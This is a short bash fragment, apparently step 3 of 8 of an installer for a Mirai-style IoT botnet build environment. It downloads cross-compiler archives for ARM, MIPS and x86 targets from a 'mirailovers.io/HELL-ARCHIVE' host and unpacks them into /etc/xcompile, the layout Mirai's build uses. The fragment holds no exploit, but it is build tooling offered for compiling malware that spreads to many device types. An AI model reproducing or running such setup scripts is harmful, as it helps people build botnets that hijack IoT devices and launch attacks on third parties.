#!/bin/bash


set -e
echo -e "${GREEN}[3/8] Setting up cross-compilers...${NC}"

COMPILER_BASE_URL="https://www.mirailovers.io/HELL-ARCHIVE/COMPILERS"
# Only: armv4l, armv5l, armv6l, armv7l, mips, mipsel, i586, x86_64 (output names: arm4, arm5, arm6, arm7, mips, mpsl, x86, x86_64)
CROSS_ARCHES=(armv4l armv5l armv6l armv7l mips mipsel i586 x86_64)

mkdir -p /etc/xcompile
cd /etc/xcompile

for arch in "${CROSS_ARCHES[@]}"; do
    if [ -d "/etc/xcompile/$arch" ]; then
        echo -e "${YELLOW}    $arch already present, skipping${NC}"
        continue
    fi
    echo -e "${YELLOW}    Downloading $arch...${NC}"
    if wget -q "$COMPILER_BASE_URL/cross-compiler-$arch.tar.bz2" -O "$arch.tar.bz2" 2>/dev/null; then
        echo -e "${YELLOW}    Extracting $arch...${NC}"
        if tar -xjf "$arch.tar.bz2" 2>/dev/null; then
            if [ -d "cross-compiler-$arch" ]; then
                mv "cross-compiler-$arch" "$arch"
            fi
        fi
        rm -f "$arch.tar.bz2"
        echo -e "${GREEN}    $arch done${NC}"
    else
        echo -e "${RED}    [!] Failed to download $arch${NC}"
    fi
done

cd "$SCRIPT_DIR"
echo -e "${GREEN}[+] Cross-compilers installed to /etc/xcompile/${NC}"